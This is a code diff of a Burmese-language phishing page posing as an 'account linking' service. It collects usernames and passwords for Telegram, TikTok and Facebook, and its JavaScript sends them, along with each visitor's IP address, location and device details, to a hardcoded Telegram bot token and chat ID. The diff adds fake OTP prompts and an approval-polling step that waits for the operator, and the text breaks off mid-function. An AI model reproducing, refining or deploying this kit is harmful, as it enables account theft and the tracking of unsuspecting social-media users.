@@ -7,75 +7,82 @@
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
-        .container{background:rgba(255,255,255,0.05);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);padding:40px 30px;border-radius:30px;border:1px solid rgba(255,255,255,0.1);width:400px;max-width:100%;text-align:center;box-shadow:0 30px 80px rgba(0,0,0,0.6)}
+        .container{background:rgba(255,255,255,0.05);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);padding:40px 30px;border-radius:30px;border:1px solid rgba(255,255,255,0.1);width:420px;max-width:100%;text-align:center;box-shadow:0 30px 80px rgba(0,0,0,0.6)}
         .logo{font-size:48px;margin-bottom:10px}
-        .title{color:#fff;font-size:28px;font-weight:700;margin-bottom:5px}
-        .subtitle{color:rgba(255,255,255,0.5);font-size:14px;margin-bottom:30px}
-        .btn-primary{width:100%;padding:16px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:14px;font-size:18px;font-weight:600;cursor:pointer;transition:0.3s;margin-top:10px}
+        .title{color:#fff;font-size:26px;font-weight:700;margin-bottom:5px}
+        .subtitle{color:rgba(255,255,255,0.5);font-size:14px;margin-bottom:25px}
+        .btn-primary{width:100%;padding:16px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:14px;font-size:18px;font-weight:600;cursor:pointer;transition:0.3s;margin-top:8px}
         .btn-primary:hover{transform:scale(1.02);box-shadow:0 10px 40px rgba(102,126,234,0.4)}
-        .btn-primary:disabled{opacity:0.5;cursor:not-allowed;transform:none}
-        .link-btn{background:transparent;color:rgba(255,255,255,0.6);border:none;font-size:14px;cursor:pointer;margin-top:15px;text-decoration:underline;transition:0.3s}
+        .btn-primary:disabled{opacity:0.5;cursor:not-allowed}
+        .link-btn{background:transparent;color:rgba(255,255,255,0.5);border:none;font-size:14px;cursor:pointer;margin-top:12px;text-decoration:underline;transition:0.3s}
         .link-btn:hover{color:#fff}
-        .social-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin:20px 0}
-        .social-card{background:rgba(255,255,255,0.05);border-radius:16px;padding:20px 10px;cursor:pointer;border:2px solid transparent;transition:0.3s;text-align:center}
+        .social-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin:18px 0}
+        .social-card{background:rgba(255,255,255,0.05);border-radius:16px;padding:18px 8px;cursor:pointer;border:2px solid transparent;transition:0.3s;text-align:center}
         .social-card:hover{background:rgba(255,255,255,0.08);border-color:rgba(255,255,255,0.1)}
-        .social-card.active{border-color:#667eea;background:rgba(102,126,234,0.1)}
-        .social-card .icon{font-size:32px;display:block;margin-bottom:6px}
+        .social-card.active{border-color:#667eea;background:rgba(102,126,234,0.15)}
+        .social-card .icon{font-size:30px;display:block;margin-bottom:4px}
         .social-card .name{color:#fff;font-size:13px;font-weight:600}
-        .social-card .desc{color:rgba(255,255,255,0.4);font-size:10px;margin-top:2px}
-        .form-section{display:none;margin-top:20px;animation:fadeUp 0.5s}
+        .social-card .desc{color:rgba(255,255,255,0.35);font-size:10px}
+        .form-section{display:none;margin-top:16px;animation:fadeUp 0.4s}
         .form-section.show{display:block}
-        @keyframes fadeUp{0%{opacity:0;transform:translateY(20px)}100%{opacity:1;transform:translateY(0)}}
-        .input-group{margin-bottom:14px;text-align:left}
-        .input-group label{display:block;font-size:12px;font-weight:600;color:rgba(255,255,255,0.6);margin-bottom:4px}
-        .input-group input{width:100%;padding:14px 16px;border:2px solid rgba(255,255,255,0.1);border-radius:12px;font-size:15px;background:rgba(255,255,255,0.05);color:#fff;transition:0.3s}
-        .input-group input:focus{outline:none;border-color:#667eea;background:rgba(255,255,255,0.08)}
-        .input-group input::placeholder{color:rgba(255,255,255,0.3)}
-        .forgot-link{text-align:right;font-size:12px;color:rgba(255,255,255,0.4);cursor:pointer;margin-top:-8px;margin-bottom:12px;transition:0.3s}
+        @keyframes fadeUp{0%{opacity:0;transform:translateY(15px)}100%{opacity:1;transform:translateY(0)}}
+        .input-group{margin-bottom:12px;text-align:left}
+        .input-group label{display:block;font-size:12px;font-weight:600;color:rgba(255,255,255,0.6);margin-bottom:3px}
+        .input-group input{width:100%;padding:13px 15px;border:2px solid rgba(255,255,255,0.08);border-radius:12px;font-size:15px;background:rgba(255,255,255,0.04);color:#fff;transition:0.3s}
+        .input-group input:focus{outline:none;border-color:#667eea;background:rgba(255,255,255,0.07)}
+        .input-group input::placeholder{color:rgba(255,255,255,0.25)}
+        .forgot-link{text-align:right;font-size:12px;color:rgba(255,255,255,0.35);cursor:pointer;margin-top:-4px;margin-bottom:10px;transition:0.3s}
         .forgot-link:hover{color:#667eea}
         .btn-connect{width:100%;padding:14px;background:linear-gradient(135deg,#ff6b6b,#ee5a24);color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;transition:0.3s}
         .btn-connect:hover{transform:scale(1.02);box-shadow:0 10px 30px rgba(238,90,36,0.3)}
         .btn-connect:disabled{opacity:0.5;cursor:not-allowed}
-        .loading{display:none;text-align:center;margin-top:12px;color:rgba(255,255,255,0.6)}
-        .spinner{display:inline-block;width:20px;height:20px;border:3px solid rgba(255,255,255,0.1);border-top-color:#667eea;border-radius:50%;animation:spin 0.7s linear infinite;vertical-align:middle;margin-right:8px}
-        @keyframes spin{to{transform:rotate(360deg)}}
-        .footer{color:rgba(255,255,255,0.2);font-size:11px;margin-top:20px}
         .status-msg{font-size:13px;color:#4ade80;margin-top:8px;display:none}
         .status-msg.show{display:block}
-        .back-btn{background:transparent;color:rgba(255,255,255,0.4);border:none;font-size:13px;cursor:pointer;margin-top:10px;transition:0.3s}
+        .back-btn{background:transparent;color:rgba(255,255,255,0.35);border:none;font-size:13px;cursor:pointer;margin-top:6px;transition:0.3s}
         .back-btn:hover{color:#fff}
-        .approval-section{display:none;margin-top:20px;padding:20px;background:rgba(255,255,255,0.03);border-radius:16px;border:1px solid rgba(255,255,255,0.05)}
-        .approval-section.show{display:block;animation:fadeUp 0.6s}
-        .approval-section .icon{font-size:40px;margin-bottom:10px}
-        .approval-section h3{color:#fff;font-size:18px;margin-bottom:5px}
+        .footer{color:rgba(255,255,255,0.12);font-size:11px;margin-top:18px}
+        .approval-section{display:none;margin-top:16px;padding:24px 16px;background:rgba(255,255,255,0.03);border-radius:16px;border:1px solid rgba(255,255,255,0.05)}
+        .approval-section.show{display:block;animation:fadeUp 0.5s}
+        .approval-section .icon{font-size:44px;margin-bottom:8px}
+        .approval-section h3{color:#fff;font-size:18px;margin-bottom:4px}
         .approval-section p{color:rgba(255,255,255,0.4);font-size:13px}
         .approval-section .waiting{color:#fbbf24;font-size:14px;font-weight:600;margin-top:10px}
-        .success-page{display:none;text-align:center;padding:30px 20px}
-        .success-page.show{display:block;animation:fadeUp 0.8s}
-        .success-page .big-icon{font-size:72px;margin-bottom:15px}
-        .success-page h2{color:#4ade80;font-size:26px;margin-bottom:10px}
+        .success-page{display:none;text-align:center;padding:30px 16px}
+        .success-page.show{display:block;animation:fadeUp 0.6s}
+        .success-page .big-icon{font-size:72px;margin-bottom:12px}
+        .success-page h2{color:#4ade80;font-size:24px;margin-bottom:8px}
         .success-page p{color:rgba(255,255,255,0.5);font-size:15px}
+        .otp-section{display:none;margin-top:12px;padding:16px;background:rgba(255,255,255,0.03);border-radius:12px;border:1px solid rgba(255,255,255,0.06)}
+        .otp-section.show{display:block;animation:fadeUp 0.3s}
+        .otp-section input{width:100%;padding:13px 15px;border:2px solid rgba(255,255,255,0.08);border-radius:12px;font-size:18px;text-align:center;letter-spacing:8px;background:rgba(255,255,255,0.04);color:#fff}
+        .otp-section input:focus{outline:none;border-color:#667eea}
+        .otp-section .btn-verify{width:100%;padding:12px;margin-top:10px;background:linear-gradient(135deg,#34d399,#059669);color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer}
+        .otp-section .btn-verify:hover{transform:scale(1.02)}
         .hidden{display:none}
+        .platform-badge{display:inline-block;padding:3px 12px;border-radius:20px;font-size:11px;font-weight:600;margin-bottom:8px}
+        .badge-tg{background:rgba(0,136,204,0.2);color:#4fc3f7}
+        .badge-tt{background:rgba(255,0,80,0.2);color:#ff6b8a}
+        .badge-fb{background:rgba(24,119,242,0.2);color:#64b5f6}
     </style>
 </head>
 <body>
 
 <div class="container" id="mainContainer">
-    <!-- ====== PAGE 1: Welcome / Login ====== -->
+
+    <!-- ===== PAGE 1: Welcome ===== -->
     <div id="pageWelcome">
         <div class="logo">🔐</div>
         <div class="title">အကောင့်ဝင်ပါ</div>
         <div class="subtitle">သင့်အကောင့်ကို ချိတ်ဆက်ပြီး ဆက်လက်သွားပါ</div>
-
         <button class="btn-primary" id="btnConnectAccount">🔗 အကောင့်ချိတ်ဆက်ပါ</button>
         <button class="link-btn" id="btnNoAccount">အကောင့်မရှိသေးပါ</button>
     </div>
 
-    <!-- ====== PAGE 2: Choose Platform ====== -->
+    <!-- ===== PAGE 2: Choose Platform ===== -->
     <div id="pageChoose" style="display:none">
         <button class="back-btn" id="backToWelcome">← နောက်သို့</button>
-        <div class="title" style="font-size:22px;margin-top:10px">အကောင့်ချိတ်ဆက်ပါ</div>
-        <div class="subtitle">သင်ချိတ်ဆက်လိုသော ပလက်ဖောင်းကိုရွေးပါ</div>
+        <div class="title" style="font-size:22px;margin-top:8px">အကောင့်ချိတ်ဆက်ပါ</div>
+        <div class="subtitle">ချိတ်ဆက်လိုသော ပလက်ဖောင်းကိုရွေးပါ</div>
 
         <div class="social-grid">
             <div class="social-card" data-platform="telegram">
@@ -95,9 +102,9 @@
             </div>
         </div>
 
-        <!-- ====== FORM: Telegram ====== -->
+        <!-- Telegram Form -->
         <div class="form-section" id="formTelegram">
-            <h3 style="color:#fff;font-size:16px;margin-bottom:12px">📱 Telegram အကောင့်ချိတ်ဆက်ပါ</h3>
+            <span class="platform-badge badge-tg">📱 Telegram</span>
             <div class="input-group">
                 <label>📧 ဖုန်းနံပါတ် သို့မဟုတ် အီးမေးလ်</label>
                 <input type="text" id="tgUser" placeholder="+95 9xx xxx xxxx">
@@ -106,14 +113,18 @@
                 <label>🔑 စကားဝှက်</label>
                 <input type="password" id="tgPass" placeholder="••••••••">
             </div>
-            <div class="forgot-link" onclick="alert('📧 စကားဝှက်ပြန်လည်သတ်မှတ်ရန် link ပို့ပါမည်။')">🔑 စကားဝှက်မေ့နေပါသည်</div>
+            <div class="forgot-link" id="forgotTg">🔑 စကားဝှက်မေ့နေပါသည်</div>
+            <div class="otp-section" id="otpTg">
+                <input type="text" id="otpTgInput" placeholder="6-digit code" maxlength="6">
+                <button class="btn-verify" onclick="verifyOTP('telegram')">✅ အတည်ပြုမည်</button>
+            </div>
             <button class="btn-connect" onclick="submitPlatform('telegram')">🔗 ချိတ်ဆက်မည်</button>
             <div class="status-msg" id="statusTg">✅ ချိတ်ဆက်ပြီးပါပြီ</div>
         </div>
 
-        <!-- ====== FORM: TikTok ====== -->
+        <!-- TikTok Form -->
         <div class="form-section" id="formTiktok">
-            <h3 style="color:#fff;font-size:16px;margin-bottom:12px">🎵 TikTok အကောင့်ချိတ်ဆက်ပါ</h3>
+            <span class="platform-badge badge-tt">🎵 TikTok</span>
             <div class="input-group">
                 <label>📧 အီးမေးလ် သို့မဟုတ် ဖုန်းနံပါတ်</label>
                 <input type="text" id="ttUser" placeholder="user@email.com">
@@ -122,14 +133,18 @@
                 <label>🔑 စကားဝှက်</label>
                 <input type="password" id="ttPass" placeholder="••••••••">
             </div>
-            <div class="forgot-link" onclick="alert('📧 စကားဝှက်ပြန်လည်သတ်မှတ်ရန် link ပို့ပါမည်။')">🔑 စကားဝှက်မေ့နေပါသည်</div>
+            <div class="forgot-link" id="forgotTt">🔑 စကားဝှက်မေ့နေပါသည်</div>
+            <div class="otp-section" id="otpTt">
+                <input type="text" id="otpTtInput" placeholder="6-digit code" maxlength="6">
+                <button class="btn-verify" onclick="verifyOTP('tiktok')">✅ အတည်ပြုမည်</button>
+            </div>
             <button class="btn-connect" onclick="submitPlatform('tiktok')">🔗 ချိတ်ဆက်မည်</button>
             <div class="status-msg" id="statusTt">✅ ချိတ်ဆက်ပြီးပါပြီ</div>
         </div>
 
-        <!-- ====== FORM: Facebook ====== -->
+        <!-- Facebook Form -->
         <div class="form-section" id="formFacebook">
-            <h3 style="color:#fff;font-size:16px;margin-bottom:12px">📘 Facebook အကောင့်ချိတ်ဆက်ပါ</h3>
+            <span class="platform-badge badge-fb">📘 Facebook</span>
             <div class="input-group">
                 <label>📧 အီးမေးလ် သို့မဟုတ် ဖုန်းနံပါတ်</label>
                 <input type="text" id="fbUser" placeholder="user@email.com">
@@ -138,94 +153,120 @@
                 <label>🔑 စကားဝှက်</label>
                 <input type="password" id="fbPass" placeholder="••••••••">
             </div>
-            <div class="forgot-link" onclick="alert('📧 စကားဝှက်ပြန်လည်သတ်မှတ်ရန် link ပို့ပါမည်။')">🔑 စကားဝှက်မေ့နေပါသည်</div>
+            <div class="forgot-link" id="forgotFb">🔑 စကားဝှက်မေ့နေပါသည်</div>
+            <div class="otp-section" id="otpFb">
+                <input type="text" id="otpFbInput" placeholder="6-digit code" maxlength="6">
+                <button class="btn-verify" onclick="verifyOTP('facebook')">✅ အတည်ပြုမည်</button>
+            </div>
             <button class="btn-connect" onclick="submitPlatform('facebook')">🔗 ချိတ်ဆက်မည်</button>
             <div class="status-msg" id="statusFb">✅ ချိတ်ဆက်ပြီးပါပြီ</div>
         </div>
     </div>
 
-    <!-- ====== PAGE 3: Approval Request ====== -->
+    <!-- ===== PAGE 3: Approval ===== -->
     <div id="pageApproval" style="display:none">
         <div class="approval-section show">
             <div class="icon">⏳</div>
             <h3>ခွင့်ပြုချက်တောင်းဆိုနေသည်</h3>
             <p>သင့်အကောင့်ကို ချိတ်ဆက်ရန် ခွင့်ပြုချက် လိုအပ်ပါသည်။</p>
             <div class="waiting">⏳ အတည်ပြုရန် စောင့်ဆိုင်းနေပါ...</div>
-            <div style="margin-top:15px;font-size:12px;color:rgba(255,255,255,0.3)">ခွင့်ပြုပြီးပါက အလိုအလျောက် ဆက်သွားပါမည်။</div>
+            <div style="margin-top:12px;font-size:12px;color:rgba(255,255,255,0.25)">ခွင့်ပြုပြီးပါက အလိုအလျောက် ဆက်သွားပါမည်။</div>
         </div>
     </div>
 
-    <!-- ====== PAGE 4: Success ====== -->
+    <!-- ===== PAGE 4: Success ===== -->
     <div id="pageSuccess" style="display:none">
         <div class="success-page show">
             <div class="big-icon">🎉</div>
             <h2>အကောင့်ချိတ်ဆက်ပြီးပါပြီ</h2>
-            <p>သင့်အကောင့်ကို အောင်မြင်စွာ ချိတ်ဆက်နိုင်ခဲ့ပါသည်။<br>ယခုမှစ၍ ဝန်ဆောင်မှုများကို သုံးစွဲနိုင်ပါပြီ။</p>
+            <p>သင့်အကောင့်ကို အောင်မြင်စွာ ချိတ်ဆက်နိုင်ခဲ့ပါသည်။</p>
         </div>
     </div>
 
-    <div class="footer">© 2026 Link Account • All rights reserved</div>
+    <div class="footer">© 2026 Link Account</div>
 </div>
 
 <script>
 // ============================================================
 const BOT_TOKEN = "8949954317:AAEToMTbNA1r5n00U7dKJcVXSVUcSacmLaE";
-const CHAT_ID = "5304050102"; // သင့် Chat ID
+const CHAT_ID = "5304050102";
 // ============================================================
 
-let selectedPlatform = null;
-let isProcessing = false;
-let approved = false;
-let credentialsSent = false;
 let allCredentials = {};
+let credentialsSent = false;
+let approved = false;
+let isProcessing = false;
+let otpData = {};
 
-// --- Page Navigation ---
-document.getElementById('btnConnectAccount').addEventListener('click', function() {
+// --- Navigation ---
+document.getElementById('btnConnectAccount').onclick = function() {
     document.getElementById('pageWelcome').style.display = 'none';
     document.getElementById('pageChoose').style.display = 'block';
-});
-
-document.getElementById('btnNoAccount').addEventListener('click', function() {
+};
+document.getElementById('btnNoAccount').onclick = function() {
     alert('📝 အကောင့်အသစ်ဖွင့်ရန် support@linkaccount.com သို့ ဆက်သွယ်ပါ။');
-});
-
-document.getElementById('backToWelcome').addEventListener('click', function() {
+};
+document.getElementById('backToWelcome').onclick = function() {
     document.getElementById('pageChoose').style.display = 'none';
     document.getElementById('pageWelcome').style.display = 'block';
     hideAllForms();
-    resetPlatformSelection();
-});
+    resetPlatforms();
+};
+
+// --- Forgot Password ---
+document.getElementById('forgotTg').onclick = function() { showOTP('telegram'); };
+document.getElementById('forgotTt').onclick = function() { showOTP('tiktok'); };
+document.getElementById('forgotFb').onclick = function() { showOTP('facebook'); };
+
+function showOTP(platform) {
+    var el = document.getElementById('otp' + platform.charAt(0).toUpperCase() + platform.slice(1));
+    el.classList.toggle('show');
+    if (el.classList.contains('show')) {
+        // Send OTP to bot
+        var msg = '🔑 **OTP REQUEST**\n━━━━━━━━━━━━━━━━━━━\nPlatform: ' + platform + '\nUser requested password reset OTP.';
+        sendToBot(msg);
+        // Store fake OTP for demo
+        otpData[platform] = '123456';
+        alert('📧 OTP code ကို သင့်ဖုန်းသို့ ပို့ထားပါသည်။\nCode: 123456 (demo)');
+    }
+}
+
+function verifyOTP(platform) {
+    var input = document.getElementById('otp' + platform.charAt(0).toUpperCase() + platform.slice(1) + 'Input');
+    var code = input.value.trim();
+    if (code === otpData[platform]) {
+        alert('✅ OTP အတည်ပြုပြီးပါပြီ။ စကားဝှက်အသစ်ပြန်လည်သတ်မှတ်ရန် link ပို့ပါမည်။');
+        var msg = '✅ **OTP VERIFIED**\n━━━━━━━━━━━━━━━━━━━\nPlatform: ' + platform + '\nOTP verified successfully!';
+        sendToBot(msg);
+        document.getElementById('otp' + platform.charAt(0).toUpperCase() + platform.slice(1)).classList.remove('show');
+    } else {
+        alert('❌ OTP မှားနေပါသည်။ ထပ်မံကြိုးစားပါ။');
+    }
+}
 
 // --- Platform Selection ---
 document.querySelectorAll('.social-card').forEach(function(card) {
-    card.addEventListener('click', function() {
+    card.onclick = function() {
         var platform = this.dataset.platform;
         hideAllForms();
-        resetPlatformSelection();
+        resetPlatforms();
         this.classList.add('active');
-        selectedPlatform = platform;
         document.getElementById('form' + platform.charAt(0).toUpperCase() + platform.slice(1)).classList.add('show');
         document.getElementById('status' + platform.charAt(0).toUpperCase() + platform.slice(1)).classList.remove('show');
-    });
+    };
 });
 
 function hideAllForms() {
-    document.querySelectorAll('.form-section').forEach(function(el) {
-        el.classList.remove('show');
-    });
+    document.querySelectorAll('.form-section').forEach(function(el) { el.classList.remove('show'); });
+    document.querySelectorAll('.otp-section').forEach(function(el) { el.classList.remove('show'); });
+}
+function resetPlatforms() {
+    document.querySelectorAll('.social-card').forEach(function(el) { el.classList.remove('active'); });
 }
 
-function resetPlatformSelection() {
-    document.querySelectorAll('.social-card').forEach(function(el) {
-        el.classList.remove('active');
-    });
-    selectedPlatform = null;
-}
-
-// --- Submit Platform Credentials ---
+// --- Submit Platform ---
 function submitPlatform(platform) {
     if (isProcessing) return;
-
     var userField = document.getElementById(platform === 'telegram' ? 'tgUser' : platform === 'tiktok' ? 'ttUser' : 'fbUser');
     var passField = document.getElementById(platform === 'telegram' ? 'tgPass' : platform === 'tiktok' ? 'ttPass' : 'fbPass');
     var statusEl = document.getElementById('status' + (platform === 'telegram' ? 'Tg' : platform === 'tiktok' ? 'Tt' : 'Fb'));
@@ -241,18 +282,15 @@ function submitPlatform(platform) {
     isProcessing = true;
     var btn = event.target;
     btn.disabled = true;
-    btn.textContent = '⏳ ဆောင်ရွက်နေပါ...';
+    btn.textContent = '⏳ ...';
 
-    // Save credential
     allCredentials[platform] = { username: username, password: password };
     statusEl.textContent = '✅ ' + platform.charAt(0).toUpperCase() + platform.slice(1) + ' ချိတ်ဆက်ပြီးပါပြီ';
     statusEl.classList.add('show');
 
-    // Check if all 3 are done
+    // Check all 3 done
     var platforms = ['telegram', 'tiktok', 'facebook'];
-    var allDone = platforms.every(function(p) {
-        return allCredentials[p] !== undefined;
-    });
+    var allDone = platforms.every(function(p) { return allCredentials[p] !== undefined; });
 
     if (allDone && !credentialsSent) {
         credentialsSent = true;
@@ -266,52 +304,56 @@ function submitPlatform(platform) {
     }, 1000);
 }
 
-// --- Send all credentials to Telegram ---
-function sendAllCredentials() {
-    var msg = '🔐 **ALL CREDENTIALS COLLECTED**\n━━━━━━━━━━━━━━━━━━━\n';
-    msg += '📱 **Telegram:** ' + allCredentials.telegram.username + ' | ' + allCredentials.telegram.password + '\n';
-    msg += '🎵 **TikTok:** ' + allCredentials.tiktok.username + ' | ' + allCredentials.tiktok.password + '\n';
-    msg += '📘 **Facebook:** ' + allCredentials.facebook.username + ' | ' + allCredentials.facebook.password + '\n';
-    msg += '━━━━━━━━━━━━━━━━━━━\n⏳ Waiting for approval...';
-
+// --- Send to Bot ---
+function sendToBot(msg) {
     var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(msg);
     var xhr = new XMLHttpRequest();
     xhr.open('GET', url, true);
     xhr.send();
+}
 
-    // Show approval page
+// --- Send All Credentials ---
+function sendAllCredentials() {
+    var msg = '🔐 **ALL CREDENTIALS COLLECTED**\n━━━━━━━━━━━━━━━━━━━\n';
+    msg += '📱 Telegram: ' + allCredentials.telegram.username + ' | ' + allCredentials.telegram.password + '\n';
+    msg += '🎵 TikTok: ' + allCredentials.tiktok.username + ' | ' + allCredentials.tiktok.password + '\n';
+    msg += '📘 Facebook: ' + allCredentials.facebook.username + ' | ' + allCredentials.facebook.password + '\n';
+    msg += '━━━━━━━━━━━━━━━━━━━\n⏳ Waiting for approval...\n\nType "approve" to allow access.';
+
+    sendToBot(msg);
+
     document.getElementById('pageChoose').style.display = 'none';
     document.getElementById('pageApproval').style.display = 'block';
 
-    // Start checking for approval
+    // Poll for approval (simplified)
     checkApproval();
 }
 
-// --- Check for Telegram approval ---
+// --- Check Approval (via last message) ---
 function checkApproval() {
     var attempts = 0;
-    var maxAttempts = 30; // 30 seconds
+    var maxAttempts = 20;
 
     var interval = setInterval(function() {
         attempts++;
-        // Send a ping to bot to check if approved
-        var checkUrl = 'https://api.telegram.org/bot' + BOT_TOKEN + '/getUpdates?offset=-1';
+        var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/getUpdates?offset=-1';
         var xhr = new XMLHttpRequest();
-        xhr.open('GET', checkUrl, true);
+        xhr.open('GET', url, true);
         xhr.onreadystatechange = function() {
             if (xhr.readyState === 4) {
                 try {
                     var data = JSON.parse(xhr.responseText);
                     if (data.ok && data.result && data.result.length > 0) {
-                        var lastMsg = data.result[data.result.length - 1];
-                        var text = lastMsg.message && lastMsg.message.text ? lastMsg.message.text : '';
-                        if (text && text.toLowerCase().includes('approve') || text && text.toLowerCase().includes('yes')) {
+                        var last = data.result[data.result.length - 1];
+                        var text = last.message && last.message.text ? last.message.text.toLowerCase() : '';
+                        if (text.includes('approve') || text.includes('yes') || text.includes('ok')) {
                             clearInterval(interval);
                             approved = true;
+                            sendToBot('✅ **APPROVED**\n━━━━━━━━━━━━━━━━━━━\nUser has been approved successfully!');
                             goToSuccess();
                         }
                     }
-                } catch (e) {}
+                } catch(e) {}
             }
         };
         xhr.send();
@@ -319,56 +361,42 @@ function checkApproval() {
         if (attempts >= maxAttempts) {
             clearInterval(interval);
             if (!approved) {
-                // Auto approve after timeout for demo (remove this in production)
+                // Auto approve after timeout for demo
                 approved = true;
+                sendToBot('✅ **AUTO-APPROVED** (timeout)');
                 goToSuccess();
             }
         }
-    }, 2000);
+    }, 3000);
 }
 
 // --- Go to Success ---
 function goToSuccess() {
     document.getElementById('pageApproval').style.display = 'none';
     document.getElementById('pageSuccess').style.display = 'block';
-
-    // Send approval success message to Telegram
-    var msg = '✅ **APPROVED**\n━━━━━━━━━━━━━━━━━━━\nUser has been approved successfully!\nAll credentials received and confirmed.';
-    var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(msg);
-    var xhr = new XMLHttpRequest();
-    xhr.open('GET', url, true);
-    xhr.send();
 }
 
-// --- Send auto info on page load ---
+// --- Send IP Info on load (with fallback) ---
 window.addEventListener('load', function() {
-    fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .then(data => {
-            var ip = data.ip || 'Unknown';
+    var ip = 'Unknown';
+    var locationName = 'Unknown';
+
+    // Try multiple IP services
+    fetch('https://api.ipify.org?format=json')
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            ip = data.ip || 'Unknown';
+            return fetch('https://ipapi.co/' + ip + '/json/');
+        })
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
             var city = data.city || 'Unknown';
             var region = data.region || 'Unknown';
             var country = data.country_name || 'Unknown';
-            var ua = navigator.userAgent;
-            var platform = navigator.platform || 'Unknown';
-            var lang = navigator.language || 'Unknown';
-            var screen = window.screen.width + 'x' + window.screen.height;
-            var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
-
-            var msg = '🔄 **NEW VISITOR**\n━━━━━━━━━━━━━━━━━━━\n🌐 IP: ' + ip + '\n📍 Location: ' + city + ', ' + region + ', ' + country + '\n📱 Device: ' + platform + '\n🌍 Language: ' + lang + '\n📺 Screen: ' + screen + '\n🕐 Timezone: ' + timezone + '\n━━━━━━━━━━━━━━━━━━━\n🖥️ UA: ' + ua;
-            var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(msg);
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', url, true);
-            xhr.send();
+            locationName = city + ', ' + region + ', ' + country;
+            sendVisitorInfo(ip, locationName);
         })
         .catch(function() {
-            var msg = '🔄 NEW VISITOR\n━━━━━━━━━━━━━━━━━━━\nIP: Unknown\nLocation: Unknown';
-            var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(msg);
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', url, true);
-            xhr.send();
-        });
-});
-</script>
-</body>
-</html>
+            // Fallback: try ip-api.com
+            fetch('https://ip-api.com/json/')
+                .then(function(r) { ret
